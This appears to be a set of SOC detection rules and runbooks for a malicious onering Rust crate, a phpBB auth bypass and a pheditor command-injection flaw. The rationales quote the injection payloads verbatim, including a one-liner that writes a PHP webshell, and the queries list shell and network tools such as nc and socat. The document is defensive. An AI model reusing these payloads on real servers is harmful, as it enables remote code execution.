Git source-code harvest (log + diff HEAD^ HEAD) spawned from cargo build context AIActions on Objectives High
Detects the article-specific `git log -n 1 --pretty=format:{"commit"...}` and `git diff HEAD^ HEAD` invocations the malicious onering build.rs runs against the consuming project's repository to harvest commit metadata and the full source diff. Legitimate cargo build scripts essentially never run these. Rationale: Anchored on the two exact git invocations literally quoted in the article body — `git diff HEAD^ HEAD` and the `--pretty=format:{"commit":"%H","author":"%an"...}` log call — pinned to a cargo/rustc/build-script-* parent. Both halves together turn a benign git lookup into the onering harvest. No realistic legit build script needs HEAD^..HEAD diff content. Cross-checked against: • https://github.com/cenotelie/onering/issues/1
ATT&CKT1005 T1213.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A custom in-house build.rs that genuinely embeds commit hash for versioning (uses `git log` but typically without the `{"commit"` JSON template the article shows)
  • cargo-release / cargo-bump style tooling that diffs commits during release builds
  • A developer running `cargo build` immediately after `git rebase` and a hook re-runs git diff (rare for the parent to be build-script)
  • Crates like `vergen` or `built` that capture git info — these use `rev-parse`/`describe`, not `diff HEAD^ HEAD`
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("vergen","built","git2")) // suppress known build-info crates that legit-spawn git
Response runbook
1. Triage: Inspect InitiatingProcessFolderPath — if it points into `\.cargo\registry\src\index.crates.io-*\onering-1.4.1\` (or `~/.cargo/registry/src/.../onering-1.4.1/`) it's confirmed. Pull sibling git-log invocation in the same second. 2. Contain: Isolate the workstation, kill the cargo job, force the developer to rotate any git tokens / SSH keys / signed-commit keys held on the host. 3. Hunt: Grep all repos on the host for `onering` in Cargo.toml/Cargo.lock pinned to 1.4.1 and search the IOC Sentry domain across NetFlow/proxy for the past 30 days to estimate diff exfil cadence per repo.
let cargoParents = dynamic(["cargo.exe","cargo","rustc.exe","rustc"]);
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("git.exe", "git")
| where (ProcessCommandLine has "diff" and ProcessCommandLine has "HEAD^" and ProcessCommandLine has "HEAD")
    or ProcessCommandLine has "--pretty=format:{\"commit\""
    or ProcessCommandLine has "--pretty=format:{%22commit%22"
| where InitiatingProcessFileName startswith "build-script"
    or InitiatingProcessFileName in~ (cargoParents)
    or InitiatingProcessParentFileName in~ (cargoParents)
    or InitiatingProcessParentFileName startswith "build-script"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessFolderPath,
          InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
let cargoParents = dynamic(["cargo.exe","cargo","rustc.exe","rustc"]);
ImProcessCreate
| where TimeGenerated > ago(7d)
| where TargetProcessName endswith "git.exe" or TargetProcessName endswith "/git" or TargetProcessName == "git"
| where (TargetProcessCommandLine has "diff" and TargetProcessCommandLine has "HEAD^" and TargetProcessCommandLine has "HEAD")
    or TargetProcessCommandLine has "--pretty=format:{\"commit\""
| where ActingProcessName has_any ("build-script", "cargo", "rustc")
    or ParentProcessName has_any ("build-script", "cargo", "rustc")
| project TimeGenerated, Computer=DvcHostname, AccountName=ActorUsername,
          GitCmd=TargetProcessCommandLine, Parent=ActingProcessName,
          ParentCmd=ActingProcessCommandLine, GrandParent=ParentProcessName
| order by TimeGenerated desc
title: Git commit/diff harvest spawned from cargo build script (onering pattern)
id: 4d5e6f17-8c9a-4b2e-bf91-7d4c5e8a1f62
description: Detects the git log + git diff HEAD^ HEAD pattern the malicious onering 1.4.1 build.rs uses to exfiltrate source code.
references:
  - https://www.aikido.dev/blog/compromised-rust-crate-onering-performs-code-exfiltration
author: SOC Detection Engineering
date: 2026/06/18
tags:
  - attack.t1005
  - attack.collection
  - attack.t1213.003
logsource:
  category: process_creation
  product: windows
detection:
  git_proc:
    Image|endswith:
      - '\git.exe'
      - '/git'
  diff_cmd:
    CommandLine|contains|all:
      - 'diff'
      - 'HEAD^'
      - 'HEAD'
  log_cmd:
    CommandLine|contains: '--pretty=format:{"commit"'
  build_parent:
    ParentImage|contains:
      - '\cargo'
      - '\rustc'
      - '\build-script'
      - '/cargo'
      - '/rustc'
      - '/build-script'
  condition: git_proc and (diff_cmd or log_cmd) and build_parent
level: high
source:windows.sysmon @EventID:1 @Image:(*\\git.exe OR *\\Git.exe OR */git) (@CommandLine:(*"diff"* AND *HEAD\^* AND *HEAD*) OR @CommandLine:*--pretty\=format\:\{\"commit\"*) @ParentImage:(*\\cargo.exe OR *\\rustc.exe OR *\\build-script* OR */cargo OR */rustc OR */build-script*)
#event_simpleName=ProcessRollup2 ImageFileName=/(\\|\/)git(\.exe)?$/i (CommandLine=/diff\s+.*HEAD\^\s+HEAD/i or CommandLine=/--pretty=format:\{"commit"/i) ParentBaseFileName=/(cargo|rustc|build-script)/i
| groupBy([aid, ComputerName, ParentBaseFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="git.exe" OR Processes.process_name="git") AND (Processes.process="*--pretty=format:{*\"commit\"*" OR (Processes.process="*diff*" AND Processes.process="*HEAD^*" AND Processes.process="*HEAD*")) AND (Processes.parent_process_name="cargo.exe" OR Processes.parent_process_name="cargo" OR Processes.parent_process_name="rustc.exe" OR Processes.parent_process_name="rustc" OR Processes.parent_process_name="build-script-build.exe" OR Processes.parent_process_name="build-script-build" OR Processes.parent_process_name="build-script-main.exe" OR Processes.parent_process_name="build-script-main") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="git.exe" OR Processes.process_name="git") AND (Processes.process="*--pretty=format:{*\"commit\"*" OR (Processes.process="*diff*" AND Processes.process="*HEAD^*" AND Processes.process="*HEAD*")) AND (Processes.parent_process_name="cargo.exe" OR Processes.parent_process_name="cargo" OR Processes.parent_process_name="rustc.exe" OR Processes.parent_process_name="rustc" OR Processes.parent_process_name="build-script-build.exe" OR Processes.parent_process_name="build-script-build" OR Processes.parent_process_name="build-script-main.exe" OR Processes.parent_process_name="build-script-main") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
onering 1.4.1 Rust crate extracted to cargo registry source cache AIDelivery High
Hunts for the malicious onering 1.4.1 crate body landing on disk in the per-user cargo registry source cache (`~/.cargo/registry/src/index.crates.io-*/onering-1.4.1/`). Triggers as soon as any host pulls and unpacks the compromised version — before the build script ever runs. Rationale: The article pins the IOC to crates.io version 1.4.1 of onering; cargo unpacks crates into `~/.cargo/registry/src/<index-host>/<crate>-<version>/`, so the literal folder fragment `onering-1.4.1` under `.cargo\registry\src\` is a deterministic on-disk artefact of pulling the bad version. Catches before the build.rs ever fires. Cross-checked against: • https://github.com/cenotelie/onering/issues/1
ATT&CKT1195.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher cloning the bad crate into a sandbox for IOC validation
  • SCA/SBOM tooling like Aikido / Snyk / cargo-audit fetching the version to flag it
  • Internal mirror replication of crates.io that pulls all versions including malicious one
  • Developer running `cargo download onering@1.4.1` to inspect the build.rs payload
Suppression filter
| where InitiatingProcessAccountName !in~ ("sca-scanner$","aikido-svc","snyk-svc") // exclude SBOM tooling service accounts
Response runbook
1. Triage: Check which Cargo.toml on the host pins or transitively pulls `onering = "1.4.1"` — confirm intent vs accidental upgrade. Look for any DeviceProcessEvents within 10 min of FirstSeen showing build-script-build.exe or curl.exe to the IOC Sentry endpoint. 2. Contain: Delete the cached crate, pin onering to a known-clean version (≤1.4.0) in workspace Cargo.toml, revoke any git/SSH creds the host holds because at minimum one git diff HEAD^ HEAD has likely been exfiltrated. 3. Hunt: Run the same pattern across the developer estate and CI runners; pivot to Cargo.lock files in shared repos to identify all downstream projects that picked up 1.4.1.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has @"\.cargo\registry\src\" or FolderPath has "/.cargo/registry/src/"
| where FolderPath has "onering-1.4.1" or FileName has "onering-1.4.1"
| summarize FilesWritten=dcount(FileName), FirstSeen=min(Timestamp), LastSeen=max(Timestamp),
            SampleFiles=make_set(FileName, 10), SampleFolder=any(FolderPath)
            by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName
| order by FirstSeen desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in~ ("FileCreated","FileRenamed","FileModified","FileCreate")
| where TargetFilePath has @"\.cargo\registry\src\" or TargetFilePath has "/.cargo/registry/src/"
| where TargetFilePath has "onering-1.4.1"
| summarize FilesWritten=dcount(TargetFileName), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated),
            SampleFiles=make_set(TargetFileName, 10), SampleFolder=any(TargetFilePath)
            by DvcHostname, ActorUsername, ActingProcessName
| order by FirstSeen desc

phpBB admin control panel access without preceding successful authentication (CVE-2026-48611 post-exploit) AIExploitation Medium
Hunts the article's core claim — a single unauthenticated HTTP request yields a valid session as any user, including administrators. Detects clients hitting phpBB's /adm/ control panel (or other authenticated-only endpoints) that have no prior successful login POST from the same source within the lookback. Web-access-log baseline anti-join; the auth bypass leaves no login event behind it. Rationale: Detects the article's headline claim: 'A single unauthenticated HTTP request is enough to obtain a valid session as any user' — manifests in web logs as access to /adm/ (the phpBB ACP path is a hardcoded, article-specific string) without any preceding POST to /ucp.php, /app.php/user/login, or the new /user/oauth/authenticate/ endpoint named in the article body. Cross-checked CVE-2026-48611 (the actual auth-bypass CVE per Bleeping Computer / Infosecurity-Magazine) and the phpBB 3.3.17 release announcement. Cross-checked against: • https://www.bleepingcomputer.com/news/security/phpbb-forum-fixes-auth-bypass-bug-lurking-for-a-decade/ • https://www.infosecurity-magazine.com/news/phpbb-authentication-bypass/ • https://www.phpbb.com/community/viewtopic.php?t=2672170 • https://www.sentinelone.com/vulnerability-database/cve-2026-29199/
ATT&CKT1190 T1078
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Session cookie-based access where the original login POST happened outside the lookback window (long-lived sessions)
  • Admin accessing ACP via SSO/OAuth where the login flow terminates on a different host that isn't in the same web-log stream
  • Internal monitoring/uptime probes (Pingdom, Datadog synthetics) hitting /adm/ via stored auth headers
  • Load balancer health checks misconfigured to probe /adm/ paths
  • Legitimate admins resuming a persistent session after a browser restart
Suppression filter
| where csUserAgent !contains "Pingdom" and csUserAgent !contains "Googlebot" and csUserAgent !contains "bingbot" and csUserAgent !contains "DatadogSynthetics" and csUserAgent !contains "UptimeRobot"
| where cIP !in ("<corp-monitoring-egress-1>", "<corp-monitoring-egress-2>")
Response runbook
1. Triage: pull the cIP's full request trail to the phpBB host in the last 24h — confirm there really is no login POST and no inherited session cookie carrying a known admin user. Geo-locate the cIP and check if it matches the admin's normal source. 2. Contain: if confirmed unauthenticated admin access, force-rotate the admin password, invalidate all phpBB sessions (truncate phpbb_sessions), confirm version is 3.3.17+ (upgrade now if not), and pull the running config to look for attacker-created admin accounts in phpbb_user_group (group_id 5/6). 3. Hunt: enumerate every phpBB instance in the estate (W3CIISLog/Apache access logs for /ucp.php or /viewforum.php), check each for the same anti-join pattern, and search the cIP against all internet-facing assets for parallel exploitation.
let Lookback = 7d;
let AdminHits = W3CIISLog
  | where TimeGenerated > ago(Lookback)
  | where csUriStem startswith "/adm/" or csUriStem =~ "/adm/index.php"
  | where scStatus in (200, 302)
  | project AdminTime = TimeGenerated, cIP, csUriStem, csUserName, csUserAgent, csMethod, sSiteName;
let LoginPosts = W3CIISLog
  | where TimeGenerated > ago(Lookback)
  | where csMethod =~ "POST"
  | where csUriStem in~ ("/ucp.php", "/app.php/user/login")
     or csUriStem startswith "/user/oauth/authenticate/"
     or (csUriStem =~ "/ucp.php" and csUriQuery has "mode=login")
  | where scStatus in (200, 302, 303)
  | project LoginTime = TimeGenerated, cIP, sSiteName;
AdminHits
| join kind=leftanti LoginPosts on cIP, sSiteName
| summarize FirstAdminHit = min(AdminTime), LastAdminHit = max(AdminTime),
            AdminRequests = count(), DistinctAdminPaths = dcount(csUriStem),
            SampleEndpoints = make_set(csUriStem, 10),
            UserAgents = make_set(csUserAgent, 5)
            by cIP, sSiteName
| where AdminRequests >= 1
| order by FirstAdminHit desc

Mass phpBB reconnaissance + authentication endpoint burst (CVE-2026-48611 mass exploitation) AIReconnaissance Medium
Detects the Santy-style scanning pattern the article explicitly recalls — a single source enumerating phpBB-specific endpoints (memberlist.php for target picking, then ucp.php / login / OAuth callbacks) in a tight time window. The article notes the default-public memberlist makes target selection trivial, so the scan-then-auth-bypass sequence is the most likely mass-exploitation shape. Rationale: Anchors on the article's explicit signature strings: memberlist.php (called out by name as the public default-on enumeration surface), ucp.php (phpBB user control panel), and the newly-named /user/oauth/authenticate/ post-patch path. The article's own Santy-worm framing — search-engine-driven mass exploitation against tens of thousands of forums — predicts exactly this burst-scan shape. Corroborated against the phpBB 3.3.17 release thread and Bleeping Computer's report which confirms the bug is trivially exploitable with a single unauthenticated request, making mass scanning the expected operator behaviour. Cross-checked against: • https://www.bleepingcomputer.com/news/security/phpbb-forum-fixes-auth-bypass-bug-lurking-for-a-decade/ • https://www.phpbb.com/community/viewtopic.php?t=2672170 • https://www.infosecurity-magazine.com/news/phpbb-authentication-bypass/
ATT&CKT1595.002 T1190
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Search-engine crawlers (Googlebot, Bingbot) indexing public phpBB forum content including memberlist
  • Legitimate vulnerability scanners run by the asset owner (Nessus, Qualys, internal Aikido scans) probing the same phpBB endpoints
  • High-traffic single-user browsing where one human navigates memberlist → topic → login → ACP in normal session flow
  • Backup/mirror tools (wget, HTTrack) crawling the forum's full URL tree
  • CDN cache warming that hits a wide swathe of phpBB pages quickly
Suppression filter
| where csUserAgent !contains "Googlebot" and csUserAgent !contains "bingbot" and csUserAgent !contains "Pingdom" and csUserAgent !contains "DuckDuckBot" and csUserAgent !contains "DatadogSynthetics" and csUserAgent !contains "UptimeRobot" and csUserAgent !contains "Nessus" and csUserAgent !contains "Qualys"
| where cIP !in ("<approved-scanner-ip-1>", "<approved-scanner-ip-2>")
Response runbook
1. Triage: confirm the source IP is external and not a known scanner / search-engine bot (rDNS check + ASN). Pull the full request stream from that cIP — were the responses 200 (likely exploit attempt) or 401/403 (failed scan)? Look for any 302 to an admin/session endpoint indicating a successful bypass. 2. Contain: if responses indicate successful auth bypass, block the source IP at WAF/edge, force-invalidate all phpBB sessions on the affected host, and rotate admin credentials. Confirm phpBB version is upgraded to 3.3.17 (or master for 4.x) — if not, take the forum into maintenance mode and patch before re-opening. 3. Hunt: pivot to all other phpBB instances in the estate and apply the same query; check for the same source IP touching multiple instances. Search outbound traffic from the phpBB host post-incident for web-shell C2 indicators (cobalt strike beacon shape, anomalous DNS).
let WindowMinutes = 5;
let PhpBbPaths = dynamic(["/memberlist.php", "/ucp.php", "/app.php/user/login", "/adm/index.php", "/viewtopic.php"]);
W3CIISLog
| where TimeGenerated > ago(1d)
| where csUriStem in~ (PhpBbPaths) or csUriStem startswith "/user/oauth/authenticate/" or csUriStem startswith "/app.php/user/oauth/"
| summarize TotalRequests = count(),
            DistinctPaths = dcount(csUriStem),
            PathsHit = make_set(csUriStem, 10),
            UserAgents = make_set(csUserAgent, 5),
            Methods = make_set(csMethod, 5),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated)
            by cIP, sSiteName, bin(TimeGenerated, WindowMinutes * 1m)
| where DistinctPaths >= 3 and TotalRequests >= 10
| extend MemberlistHit = tostring(PathsHit) contains "memberlist.php"
| extend AuthEndpointHit = tostring(PathsHit) contains "ucp.php" or tostring(PathsHit) contains "user/login" or tostring(PathsHit) contains "oauth/authenticate"
| where MemberlistHit and AuthEndpointHit
| order by FirstSeen desc

HTTP POST to pheditor.php with shell metacharacters in 'dir' parameter (CVE-2026-48030) AIDelivery High
Hunts for the CVE-2026-48030 exploit shape: an authenticated POST to pheditor.php with action=terminal and a dir parameter carrying shell metacharacters that bypass the TERMINAL_COMMANDS whitelist. Targets the request layer (web/WAF logs) before any process or file telemetry fires. Rationale: Article PoC Step 4 explicitly demonstrates the exploit with `action=terminal` + `dir=/tmp; curl -s https://ifconfig.me #` — a literal semicolon in the dir POST parameter. We pin on the vulnerable endpoint string `pheditor.php`, the parameter shape `action=terminal` + `dir=`, and the shell metacharacters that bypass the whitelist guard the article quotes from lines 554–586. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843
ATT&CKT1190 T1059.004
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin pasting a directory path containing a literal semicolon (rare but possible on Windows-style paths)
  • Security scanner (Nuclei, Nessus) probing pheditor.php with the published CVE PoC payload
  • Internal red-team or vulnerability validation exercises
  • Pheditor developers running PoC tests against a staging instance
Suppression filter
| where not (SourceIP in ("10.0.0.0/8", "<known_scanner_ranges>")) and not (RequestClientApplication has_any ("Nessus", "Nuclei", "Qualys", "Burp"))
Response runbook
1) Triage: pull the full POST body for the matching request — confirm action=terminal and the dir= value carries unescaped shell metacharacters. Cross-reference SourceIP against known admin/scanner ranges. 2) Contain: block SourceIP at the WAF/edge, force-rotate the affected pheditor admin password, and disable the terminal permission in pheditor config (TERMINAL_COMMANDS) until the host can be upgraded past v2.0.3. 3) Hunt: pivot on the web server host's DeviceProcessEvents for php-fpm/apache2 spawning shell/curl/wget in the next 5 min (UC2), and DeviceFileEvents for new .php files under /var/www (UC3).

| where TimeGenerated > ago(7d)
| where DeviceVendor in~ ("Imperva", "F5", "Cloudflare", "Fortinet", "Palo Alto Networks", "ModSecurity")
| where RequestURL has "pheditor.php"
| where RequestMethod =~ "POST"
| where RequestContext has_any ("action=terminal", "action%3Dterminal")
| where RequestContext matches regex @"(?i)dir=[^&]*(%3B|;|%7C|\||%26%26|&&|%24%28|\$\(|%60|`|%3E|>|%0A)"
| project TimeGenerated, SourceIP, DestinationIP, RequestURL, RequestMethod, RequestClientApplication, RequestContext, DeviceAction
| order by TimeGenerated desc

PHP/Apache web server spawning shell or LOLBin post-Pheditor exploitation AIExploitation High
Detects php-fpm, apache2, httpd, or nginx spawning interactive shells or network LOLBins — the immediate downstream signal of CVE-2026-48030 exploitation. The article's PoC Step 4 explicitly shows curl being executed via the dir injection bypass. Rationale: Article PoC Step 5 shows the attacker dropping a webshell via dir injection — the verbatim exploit chain is `dir=/var/www/html; echo '<?php system(...) ?>' > shell.php #`, and Step 4 shows curl being invoked. Both require the web-server user (article confirms `uid=33(www-data)`) spawning a child shell/LOLBin from php-fpm/apache. We pin on the parent (web server binary) + child (shell or download tool) + user (www-data and equivalents) triad. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Composer/Drush/WP-CLI maintenance scripts invoking curl from a CLI PHP context
  • Application cron jobs running under www-data that legitimately shell out
  • Container image build steps where Apache spawns curl during entrypoint
  • Site-health plugins (e.g. ManageWP) calling external endpoints via curl
  • PHP-FPM worker invoking ImageMagick/ffmpeg subprocesses for media processing
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("/usr/local/bin/composer", "/usr/local/bin/drush", "/usr/local/bin/wp", "/etc/cron.")) and not (ProcessCommandLine has_any ("--cron", "cli/php"))
Response runbook
1) Triage: pull the child process's full command line — look for the article-specific patterns `ifconfig.me`, `> /var/www/*.php`, `<?php`, base64 blobs, or reverse-shell flags (`-e /bin/sh`, `bash -i`). Confirm the parent PID's TTY is null (web context). 2) Contain: isolate the host via Defender Live Response, kill the parent php-fpm worker pool, snapshot /var/www for forensics, and rotate the pheditor admin credential. 3) Hunt: query DeviceFileEvents for new .php under /var/www on this host (UC3) and DeviceNetworkEvents for outbound from the same InitiatingProcessId (UC4). Pull the matching CommonSecurityLog row to identify the source IP that landed the exploit (UC1).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has_any ("php-fpm", "apache2", "httpd", "nginx", "php")
| where FileName in~ ("sh", "bash", "dash", "ash", "zsh", "curl", "wget", "nc", "ncat", "python", "python3", "perl", "ruby", "socat")
| where AccountName in~ ("www-data", "apache", "nginx", "http", "httpd")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("php-fpm", "apache2", "httpd", "nginx", "/php")
| where TargetProcessName has_any ("/sh", "/bash", "/dash", "/ash", "/zsh", "/curl", "/wget", "/nc", "/ncat", "/python", "/perl", "/ruby", "/socat")
| where ActorUsername in~ ("www-data", "apache", "nginx", "http", "httpd")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine, SHA256
| order by TimeGenerated desc

PHP webshell file dropped to webroot by web server process (Pheditor RCE) AIInstallation High
Detects new .php / .phtml / .phar files written under /var/www, /srv/www, or /usr/share/nginx by php-fpm, apache, or a shell spawned from them — the post-RCE persistence step the article shows verbatim in PoC Step 5. Rationale: Article PoC Step 5 literally executes `dir=/var/www/html; echo '<?php system($_GET["c"]);?>' > /var/www/html/shell.php #` and confirms RCE as `uid=33(www-data)`. We pin on the article's webroot path `/var/www/html`, the PHP file extension, and the web-server-user / web-server-process actor identity from the PoC. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • WordPress/Drupal core/plugin auto-updates writing new PHP into wp-content or sites/all
  • Composer dependency installs into /var/www/vendor
  • Application caches that write PHP class maps (e.g. Symfony cache:warmup, Laravel route:cache)
  • Site backup-restore operations un-tarring PHP files
  • Pheditor itself being used legitimately by an admin to save a PHP file
Suppression filter
| where not (FolderPath has_any ("/wp-content/upgrade/", "/vendor/composer/", "/var/cache/", "/storage/framework/cache/")) and not (InitiatingProcessCommandLine has_any ("composer install", "composer update", "wp core update", "drush updb"))
Response runbook
1) Triage: cat the new file — look for the article's signature payload `<?php system($_GET` or other one-liner shells (`assert(`, `eval(`, `passthru(`, `preg_replace(.../e)`). Capture SHA256 + file path. 2) Contain: quarantine the file (`chmod 000`), block its URL at the WAF, snapshot the host, then rotate the pheditor admin credential and disable the terminal action. 3) Hunt: pivot on the dropping process's PID to DeviceProcessEvents for other children (UC2), and to DeviceNetworkEvents for outbound the same PID made (UC4). Search all hosts for files with the same SHA256.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType == "FileCreated"
| where FolderPath has_any ("/var/www", "/srv/www", "/usr/share/nginx")
| where FileName endswith ".php" or FileName endswith ".phtml" or FileName endswith ".phar"
| where InitiatingProcessFileName has_any ("php-fpm", "apache2", "httpd", "nginx", "sh", "bash", "dash")
   or InitiatingProcessAccountName in~ ("www-data", "apache", "nginx", "http", "httpd")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType == "FileCreated"
| where TargetFilePath has_any ("/var/www", "/srv/www", "/usr/share/nginx")
| where TargetFileExtension in~ ("php", "phtml", "phar")
| where ActingProcessName has_any ("php-fpm", "apache2", "httpd", "nginx", "/sh", "/bash", "/dash")
   or ActorUsername in~ ("www-data", "apache", "nginx", "http", "httpd")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc

Outbound C2 connection from PHP-FPM or Apache web server process (Pheditor post-exploitation) AICommand & Control Medium
Detects php-fpm, apache2, httpd, or nginx making outbound connections to public IPs — the C2/exfil signal that follows the article's PoC Step 4 (curl ifconfig.me) or a reverse shell from a dropped webshell. Rationale: Article PoC Step 4 explicitly fires `curl -s https://ifconfig.me` from within the web server context to confirm RCE — meaning the web-server PID makes an outbound connection. We pin on the web-server binary as the initiating process plus a non-RFC1918 destination, which is the article-specific shape (and unusual for a web server, which normally only listens, not connects outbound). Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843
ATT&CKT1071.001 T1095
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • WordPress site-health checks calling api.wordpress.org and other plugin update endpoints
  • Composer downloading dependencies from packagist.org (if PHP CLI runs as www-data)
  • License validation calls to vendor SaaS endpoints
  • Geo-IP enrichment plugins calling ip-api.com / ipinfo.io
  • Webmention/Pingback features hitting external blogs
Suppression filter
| where not (RemoteUrl has_any ("wordpress.org", "packagist.org", "composer.org", "github.com", "github.io", "licensing.example.com")) and not (RemotePort == 443 and RemoteUrl endswith ".cdn.cloudflare.net")
Response runbook
1) Triage: enrich RemoteIP against threat intel; check WHOIS/ASN. Compare the timestamp against the web access log row for pheditor.php to see if the connection is within ~5s of the suspicious POST (UC1). 2) Contain: block the RemoteIP at the egress firewall, isolate the host if the connection matches known C2 infrastructure or is on a non-standard port. Snapshot the php-fpm worker's memory before killing. 3) Hunt: pull all DeviceNetworkEvents for the same InitiatingProcessId in the prior 24h, and check DeviceFileEvents for files written under /tmp or /var/www tied to that PID (UC3).
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName has_any ("php-fpm", "apache2", "httpd", "nginx", "php")
| where RemoteIPType == "Public"
| where InitiatingProcessAccountName in~ ("www-data", "apache", "nginx", "http", "httpd")
| summarize ConnCount = count(), Ports = make_set(RemotePort, 20), Urls = make_set(RemoteUrl, 20), FirstSeen = min(Timestamp), LastSeen = max(Timestamp)
    by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, RemoteIP
| where ConnCount >= 1
| order by FirstSeen desc
ImNetworkSession
| where TimeGenerated > ago(7d)
| where SrcUsername in~ ("www-data", "apache", "nginx", "http", "httpd")
| where DvcHostname has_any ("web", "app", "pheditor")
| where not (ipv4_is_private(DstIpAddr))
| where isnotempty(DstIpAddr)
| extend Process = tostring(parse_json(EventOriginalUid))
| summarize ConnCount = count(), Ports = make_set(DstPortNumber, 20), Urls = make_set(Url, 20), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated)
    by DvcHostname, SrcUsername, DstIpAddr
| order by FirstSeen desc

Repeated POSTs to pheditor.php with varying 'dir' parameter (discovery / whitelist probing) AIReconnaissance Medium
Hunts for the pre-exploitation reconnaissance shape: a single source IP / session repeatedly POSTing to pheditor.php action=terminal with many distinct dir values, indicating an attacker probing path layout and whitelist boundaries before landing the CVE-2026-48030 exploit. Rationale: Article notes the exploit `completely bypassing the TERMINAL_COMMANDS whitelist` — the attacker must first learn which paths/commands are interesting (PoC walks through /tmp and /var/www/html). The discovery shape is many distinct dir= values from a single source in a short window. We pin on the article's endpoint string `pheditor.php`, the parameter `action=terminal`, and high cardinality on the dir parameter. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843
ATT&CKT1083 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate admin using Pheditor's file browser feature to traverse the filesystem
  • Automated configuration management touching pheditor.php for health checks
  • QA / regression test suites exercising the terminal endpoint with varying valid directories
  • Vulnerability scanners (Nessus, Qualys) walking the endpoint with their CVE PoC fuzzer
Suppression filter
| where not (SourceIP in ("<admin_jumpbox_ips>")) and not (RequestClientApplication has_any ("Nessus", "Qualys", "PingdomTMS"))
Response runbook
1) Triage: inspect the dir_value samples — legitimate Pheditor use typically stays within app dirs (e.g. /var/www/html/<project>), while reconnaissance touches system paths (/etc, /bin, /usr/bin, /root, /home). Cross-reference SourceIP against the admin allowlist. 2) Contain: if SourceIP is non-admin, block at the WAF and disable terminal permission in pheditor config. Force-rotate the credential the session was using. 3) Hunt: pivot SourceIP forward in time for any POSTs that turned into successful UC2 process spawns or UC3 file drops, and backward for the initial authentication burst against pheditor_password.
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestURL has "pheditor.php"
| where RequestMethod =~ "POST"
| where RequestContext has_any ("action=terminal", "action%3Dterminal")
| extend dir_value = extract(@"(?i)dir=([^&\s\"]+)", 1, RequestContext)
| where isnotempty(dir_value)
| summarize DistinctDirs = dcount(dir_value), DirsSampled = make_set(dir_value, 20), Posts = count(), First = min(TimeGenerated), Last = max(TimeGenerated)
    by SourceIP, RequestClientApplication, bin(TimeGenerated, 10m)
| where DistinctDirs >= 5
| order by First desc
source:(nginx OR apache OR waf) @http.method:POST @http.url_details.path:*pheditor.php* @http.request_body:*action\=terminal* @http.request_body:*dir\=*
WEB
search (index=proxy OR index=waf OR index=web) sourcetype IN ("access_combined","modsec_audit","nginx:plus:access") uri_path="*pheditor.php*" method=POST
| rex field=_raw "(?i)action=terminal"
| rex field=_raw "(?i)dir=(?<dir_value>[^&\"\s]+)"
| where isnotnull(dir_value)
| bin _time span=10m
| stats dc(dir_value) as distinct_dirs values(dir_value) as dirs_sampled count as posts by _time, src, http_user_agent
| where distinct_dirs >= 5
| sort - _time

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
